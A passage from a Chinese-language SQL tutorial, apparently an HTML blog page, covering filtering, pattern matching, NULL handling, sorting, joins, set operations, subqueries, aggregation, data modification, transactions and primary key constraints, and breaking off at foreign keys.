<li><p><strong>功能</strong>：过滤满足条件的行，类似于关系代数中的选择运算。</p>
</li>
<li><p>语法：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>条件类型：</p>
<ul>
<li><p>比较运算符：&#x3D;,&lt;&gt;,&lt;, &gt;,&lt;&#x3D;, &gt;&#x3D;</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> salary <span class="operator">&gt;</span> <span class="number">5000</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>逻辑运算符：AND, OR,NOT</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> orders <span class="keyword">WHERE</span> status <span class="operator">=</span> <span class="string">&#x27;Shipped&#x27;</span> <span class="keyword">AND</span> total <span class="operator">&gt;</span> <span class="number">100</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>范围筛选（BETWEEN）：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> price <span class="keyword">BETWEEN</span> <span class="number">10</span> <span class="keyword">AND</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>集合成员（IN）：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> role <span class="keyword">IN</span> (<span class="string">&#x27;Admin&#x27;</span>, <span class="string">&#x27;Manager&#x27;</span>);</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p><strong>注意事项</strong>：条件顺序可能影响性能，优先使用索引列。</p>
</li>
</ul>
<hr>
<h4 id="3-字符串模式匹配（LIKE-NOT-LIKE）"><a href="#3-字符串模式匹配（LIKE-NOT-LIKE）" class="headerlink" title="3. 字符串模式匹配（LIKE&#x2F;NOT LIKE）"></a><strong>3. 字符串模式匹配（LIKE&#x2F;NOT LIKE）</strong></h4><ul>
<li><p><strong>功能</strong>：通过通配符匹配字符串。</p>
</li>
<li><p>语法：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">WHERE</span> <span class="keyword">column</span> <span class="keyword">LIKE</span> <span class="string">&#x27;pattern&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>通配符：</p>
<ul>
<li><p>%：匹配任意长度字符（包括空）。</p>
<p>sql</p>
<p>复制</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> books <span class="keyword">WHERE</span> title <span class="keyword">LIKE</span> <span class="string">&#x27;SQL%&#x27;</span>; <span class="comment">-- 匹配以 SQL 开头</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>_：匹配单个字符。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> codes <span class="keyword">WHERE</span> <span class="keyword">value</span> <span class="keyword">LIKE</span> <span class="string">&#x27;A_C&#x27;</span>; <span class="comment">-- 匹配如 ABC, A1C</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>转义字符</p>
<p>：使用<code>ESCAPE</code>处理特殊符号。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logs <span class="keyword">WHERE</span> message <span class="keyword">LIKE</span> <span class="string">&#x27;%\%%&#x27;</span> <span class="keyword">ESCAPE</span> <span class="string">&#x27;\&#x27;</span>; <span class="comment">-- 匹配含 % 的文本</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p><strong>大小写敏感性</strong>：取决于数据库配置（如 PostgreSQL 默认区分，MySQL 不区分）。</p>
</li>
</ul>
<hr>
<h4 id="4-NULL-值处理"><a href="#4-NULL-值处理" class="headerlink" title="4. NULL 值处理"></a><strong>4. NULL 值处理</strong></h4><ul>
<li><p><strong>功能</strong>：处理缺失或未知数据。</p>
</li>
<li><p>语法：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">WHERE</span> <span class="keyword">column</span> <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">WHERE</span> <span class="keyword">column</span> <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>关键行为：</p>
<ul>
<li><p>运算结果：任何与 NULL 的运算结果为 NULL。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">5</span> <span class="operator">+</span> <span class="keyword">NULL</span>; <span class="comment">-- 结果为 NULL</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>逻辑判断：<code>NULL = NULL</code>返回 NULL，需用IS NULL。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> commission <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p><strong>注意事项</strong>：聚合函数（如 <code>SUM</code>, <code>AVG</code>）默认忽略 NULL 值。</p>
</li>
</ul>
<hr>
<h4 id="5-输出排序（ORDER-BY）"><a href="#5-输出排序（ORDER-BY）" class="headerlink" title="5. 输出排序（ORDER BY）"></a><strong>5. 输出排序（ORDER BY）</strong></h4><ul>
<li><p><strong>功能</strong>：按指定列对结果排序。</p>
</li>
<li><p>语法：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">ORDER</span> <span class="keyword">BY</span> column1 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], column2 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>];</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>规则：</p>
<ul>
<li><p>升序（ASC）：默认，从小到大排列。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">ORDER</span> <span class="keyword">BY</span> price <span class="keyword">ASC</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>降序（DESC）：从大到小排列。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> sales <span class="keyword">ORDER</span> <span class="keyword">BY</span> sale_date <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p>多列排序：按优先级依次排序。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employees <span class="keyword">ORDER</span> <span class="keyword">BY</span> department <span class="keyword">ASC</span>, salary <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<hr>
<h4 id="6-多表查询与连接"><a href="#6-多表查询与连接" class="headerlink" title="6. 多表查询与连接"></a><strong>6. 多表查询与连接</strong></h4><ul>
<li><p><strong>功能</strong>：从多个表中组合数据。</p>
</li>
<li><p>笛卡尔积（隐式连接）：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table1, table2; <span class="comment">-- 返回所有可能的行组合</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>显式连接（JOIN）：</p>
<ul>
<li><p>内连接（INNER JOIN）：仅返回匹配的行。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> orders <span class="keyword">JOIN</span> customers <span class="keyword">ON</span> orders.customer_id <span class="operator">=</span> customers.id;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>自然连接（NATURAL JOIN）：自动匹配同名同类型列。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> departments <span class="keyword">NATURAL</span> <span class="keyword">JOIN</span> employees;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>外连接：</p>
<ul>
<li><p>左外连接（LEFT JOIN）：保留左表所有行，右表无匹配时填充 NULL。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> scores <span class="keyword">ON</span> students.id <span class="operator">=</span> scores.student_id;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>右外连接（RIGHT JOIN）</strong>：保留右表所有行，左表无匹配时填充 NULL。</p>
</li>
<li><p><strong>全外连接（FULL JOIN）</strong>：保留两侧所有行。</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>自连接：同一表连接自身，需使用别名。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a.name <span class="keyword">AS</span> employee, b.name <span class="keyword">AS</span> manager </span><br><span class="line"><span class="keyword">FROM</span> employees a </span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> employees b <span class="keyword">ON</span> a.manager_id <span class="operator">=</span> b.id;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<hr>
<h4 id="7-集合操作（UNION-INTERSECT-EXCEPT）"><a href="#7-集合操作（UNION-INTERSECT-EXCEPT）" class="headerlink" title="7. 集合操作（UNION, INTERSECT, EXCEPT）"></a><strong>7. 集合操作（UNION, INTERSECT, EXCEPT）</strong></h4><ul>
<li><p><strong>功能</strong>：合并多个查询结果。</p>
</li>
<li><p>语法：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">UNION</span> [<span class="keyword">ALL</span>] <span class="keyword">SELECT</span> ...;</span><br><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">INTERSECT</span> <span class="keyword">SELECT</span> ...;</span><br><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">EXCEPT</span> <span class="keyword">SELECT</span> ...;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>规则：</p>
<ul>
<li><p>UNION：合并结果并去重（除非使用UNION ALL）。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> employees </span><br><span class="line"><span class="keyword">UNION</span> </span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> contractors;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>INTERSECT：返回两个查询的交集。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> tableA </span><br><span class="line"><span class="keyword">INTERSECT</span> </span><br><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> tableB;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>EXCEPT：返回第一个查询有但第二个查询无的结果。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> orders </span><br><span class="line"><span class="keyword">EXCEPT</span> </span><br><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> cancelled_orders;</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p><strong>注意事项</strong>：参与集合操作的查询必须列数和类型兼容。</p>
</li>
</ul>
<hr>
<h4 id="8-子查询（Subqueries）"><a href="#8-子查询（Subqueries）" class="headerlink" title="8. 子查询（Subqueries）"></a><strong>8. 子查询（Subqueries）</strong></h4><ul>
<li><p><strong>功能</strong>：嵌套查询作为其他查询的一部分。</p>
</li>
<li><p>类型：</p>
<ul>
<li><p>标量子查询：返回单个值，用于 WHERE 或 SELECT。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name </span><br><span class="line"><span class="keyword">FROM</span> employees </span><br><span class="line"><span class="keyword">WHERE</span> salary <span class="operator">&gt;</span> (<span class="keyword">SELECT</span> <span class="built_in">AVG</span>(salary) <span class="keyword">FROM</span> employees);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>行子查询：返回一行，用于比较。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> </span><br><span class="line"><span class="keyword">FROM</span> products </span><br><span class="line"><span class="keyword">WHERE</span> (price, stock) <span class="operator">=</span> (<span class="keyword">SELECT</span> <span class="built_in">MAX</span>(price), <span class="built_in">MIN</span>(stock) <span class="keyword">FROM</span> products);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>表子查询：返回多行多列，用于 FROM 或 JOIN。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> dept_name, avg_salary </span><br><span class="line"><span class="keyword">FROM</span> (<span class="keyword">SELECT</span> department_id, <span class="built_in">AVG</span>(salary) <span class="keyword">AS</span> avg_salary <span class="keyword">FROM</span> employees <span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id) <span class="keyword">AS</span> dept_stats;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>相关子查询：引用外层查询的变量。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name </span><br><span class="line"><span class="keyword">FROM</span> employees e </span><br><span class="line"><span class="keyword">WHERE</span> salary <span class="operator">&gt;</span> (<span class="keyword">SELECT</span> <span class="built_in">AVG</span>(salary) <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> department_id <span class="operator">=</span> e.department_id);</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p>运算符：</p>
<ul>
<li><p>EXISTS：检查子查询是否返回结果。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> </span><br><span class="line"><span class="keyword">FROM</span> departments d </span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span> (<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> department_id <span class="operator">=</span> d.id);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>IN&#x2F;NOT IN：判断值是否在子查询结果中。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> </span><br><span class="line"><span class="keyword">FROM</span> products </span><br><span class="line"><span class="keyword">WHERE</span> category_id <span class="keyword">IN</span> (<span class="keyword">SELECT</span> id <span class="keyword">FROM</span> categories <span class="keyword">WHERE</span> name <span class="keyword">LIKE</span> <span class="string">&#x27;%Electronics%&#x27;</span>);</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
</ul>
<h4 id="9-分组与聚集（GROUP-BY-聚合函数）"><a href="#9-分组与聚集（GROUP-BY-聚合函数）" class="headerlink" title="9. 分组与聚集（GROUP BY, 聚合函数）"></a><strong>9. 分组与聚集（GROUP BY, 聚合函数）</strong></h4><ul>
<li><p><strong>功能</strong>：将数据按列分组并计算统计值。</p>
</li>
<li><p>语法：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, <span class="built_in">COUNT</span>(<span class="operator">*</span>) </span><br><span class="line"><span class="keyword">FROM</span> <span class="keyword">table</span> </span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> column1 </span><br><span class="line"><span class="keyword">HAVING</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>聚合函数：</p>
<ul>
<li><code>COUNT(*)</code>：统计行数（包括 NULL）。</li>
<li><code>COUNT(column)</code>：统计非 NULL 值的数量。</li>
<li><code>SUM</code> &#x2F; <code>AVG</code>：求和或平均值（忽略 NULL）。</li>
<li><code>MIN</code> &#x2F; <code>MAX</code>：找最小或最大值。</li>
</ul>
</li>
<li><p>示例：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> department, <span class="built_in">AVG</span>(salary) <span class="keyword">AS</span> avg_salary </span><br><span class="line"><span class="keyword">FROM</span> employees </span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> department </span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">AVG</span>(salary) <span class="operator">&gt;</span> <span class="number">5000</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>注意事项：</p>
<ul>
<li><code>GROUP BY</code> 后的列必须出现在 SELECT 中（除非是聚合函数）。</li>
<li><code>HAVING</code> 用于过滤分组后的结果，而 <code>WHERE</code> 过滤原始数据。</li>
</ul>
</li>
</ul>
<h4 id="10-数据更新操作（INSERT-DELETE-UPDATE）"><a href="#10-数据更新操作（INSERT-DELETE-UPDATE）" class="headerlink" title="10. 数据更新操作（INSERT, DELETE, UPDATE）"></a><strong>10. 数据更新操作（INSERT, DELETE, UPDATE）</strong></h4><ul>
<li><p>插入数据（INSERT）：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">table</span> (column1, column2) </span><br><span class="line"><span class="keyword">VALUES</span> (value1, value2), (value3, value4);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>批量插入：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> orders (product_id, quantity) </span><br><span class="line"><span class="keyword">SELECT</span> id, <span class="number">10</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> stock <span class="operator">&gt;</span> <span class="number">100</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>删除数据（DELETE）：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> <span class="keyword">condition</span>; <span class="comment">-- 删除符合条件的行</span></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> logs; <span class="comment">-- 删除所有行（谨慎使用！）</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>更新数据（UPDATE）：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">table</span> </span><br><span class="line"><span class="keyword">SET</span> column1 <span class="operator">=</span> value1, column2 <span class="operator">=</span> value2 </span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>表达式更新：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> employees </span><br><span class="line"><span class="keyword">SET</span> salary <span class="operator">=</span> salary <span class="operator">*</span> <span class="number">1.05</span> </span><br><span class="line"><span class="keyword">WHERE</span> performance_rating <span class="operator">&gt;</span> <span class="number">8</span>;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="11-事务控制（Transactions）"><a href="#11-事务控制（Transactions）" class="headerlink" title="11. 事务控制（Transactions）"></a><strong>11. 事务控制（Transactions）</strong></h4><ul>
<li><p><strong>功能</strong>：确保一组操作原子性执行（全部成功或全部回滚）。</p>
</li>
<li><p>语法：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">START</span> TRANSACTION;</span><br><span class="line"><span class="comment">-- 执行操作（INSERT/UPDATE/DELETE）</span></span><br><span class="line"><span class="keyword">COMMIT</span>; <span class="comment">-- 提交事务</span></span><br><span class="line"><span class="keyword">ROLLBACK</span>; <span class="comment">-- 回滚事务</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>隔离级别：</p>
<ul>
<li><strong>READ UNCOMMITTED</strong>：允许读取未提交的数据（可能脏读）。</li>
<li><strong>READ COMMITTED</strong>：仅读取已提交数据（避免脏读）。</li>
<li><strong>REPEATABLE READ</strong>：保证同一事务内多次读取结果一致（避免不可重复读）。</li>
<li><strong>SERIALIZABLE</strong>：最高隔离级别，完全串行化执行（避免幻读）。</li>
</ul>
</li>
<li><p>设置隔离级别：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> TRANSACTION ISOLATION LEVEL READ COMMITTED;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="12-高级连接操作"><a href="#12-高级连接操作" class="headerlink" title="12. 高级连接操作"></a><strong>12. 高级连接操作</strong></h4><ul>
<li><p>交叉连接（CROSS JOIN）：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table1 <span class="keyword">CROSS</span> <span class="keyword">JOIN</span> table2; <span class="comment">-- 显式笛卡尔积</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>Theta 连接：使用任意条件连接。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> </span><br><span class="line"><span class="keyword">FROM</span> employees e </span><br><span class="line"><span class="keyword">JOIN</span> departments d <span class="keyword">ON</span> e.salary <span class="operator">&gt;</span> d.budget <span class="operator">*</span> <span class="number">0.1</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>自连接：通过别名连接同一表。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a.name <span class="keyword">AS</span> employee, b.name <span class="keyword">AS</span> manager </span><br><span class="line"><span class="keyword">FROM</span> employees a </span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> employees b <span class="keyword">ON</span> a.manager_id <span class="operator">=</span> b.id;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="数据库约束"><a href="#数据库约束" class="headerlink" title="数据库约束"></a>数据库约束</h3><p>在数据库设计中，约束（Constraints）是确保数据完整性和一致性的关键机制。它们通过限制表中数据的输入和操作，防止无效或不一致的数据进入数据库。约束可以分为以下几类：</p>
<h4 id="主键约束（Primary-Key）"><a href="#主键约束（Primary-Key）" class="headerlink" title="主键约束（Primary Key）"></a>主键约束（Primary Key）</h4><p>主键约束用于唯一标识表中的每一行记录。一个表只能有一个主键，且主键列的值不能为<code>NULL</code>。</p>
<ul>
<li><p><strong>定义</strong>：主键约束确保表中每行数据的唯一性。</p>
</li>
<li><p><strong>SQL实现</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employees (</span><br><span class="line">    id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    name <span class="type">VARCHAR</span>(<span class="number">100</span>),</span><br><span class="line">    department <span class="type">VARCHAR</span>(<span class="number">50</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<p>或者：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> employees</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">PRIMARY</span> KEY (id);</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="外键约束（Foreign-Key）"><a href="#外键约束（Foreign-Key）" class="headerlink" title="外键约束（Foreign Key）"></a>外键约束（Foreign Key）</h4><p>外键约束用于建立两个表之间的关系，确保引用完整性。外键列的值必须是另一个表中主键列的值，或者为<code>NULL</code>。</p>
<ul>
